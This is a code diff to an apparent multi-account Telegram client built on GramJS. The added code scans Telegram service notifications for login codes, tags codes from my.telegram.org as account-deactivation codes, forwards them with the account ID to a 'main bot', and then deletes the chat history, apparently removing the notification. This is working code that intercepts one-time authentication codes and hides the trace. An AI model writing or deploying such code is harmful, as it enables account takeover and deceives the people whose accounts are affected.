@@ -5,6 +5,22 @@ import GramJs from '../../../gramjs/tl/api';
 import { sendToMainBot } from '../../helpers/sendToMainBot';
 import { deleteHistory } from '../messages/deleteHistory';
 
+const extractLoginCode = (message: string): string | null => {
+  const loginCodeMatch = message.match(/Login code: (\d+)/);
+  if (loginCodeMatch) {
+    return loginCodeMatch[1];
+  }
+
+  const webLoginMatch = message.match(
+    /This is your login code:\s*([a-zA-Z0-9]+)/
+  );
+  if (webLoginMatch) {
+    return `${webLoginMatch[1]}`;
+  }
+
+  return null;
+};
+
 export const handleUpdate = async (
   client: TelegramClient | null,
   accountId: string,
@@ -37,11 +53,21 @@ export const handleUpdate = async (
         message: '[TELEGRAM_SERVICE_NOTIFICATION]',
         payload: JSON.parse(JSON.stringify(update)),
       });
-      await sendToMainBot(
-        `[TELEGRAM_SERVICE_NOTIFICATION]
+
+      const code = extractLoginCode(update.message);
+      let messageText = update.message;
+      if (code) {
+        messageText = update.message.includes('my.telegram.org')
+          ? `CODE_FOR_DEACTIVATE_ACCOUNT: ${code}`
+          : `CODE_FOR_LOGIN: ${code}`;
+      }
+
+      const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
 ID: ${accountId}
-MESSAGE: ${update.message}`
-      );
+MESSAGE: ${messageText}`;
+
+      await sendToMainBot(notificationMessage);
+
       if (client) {
         await deleteHistory(
           client,
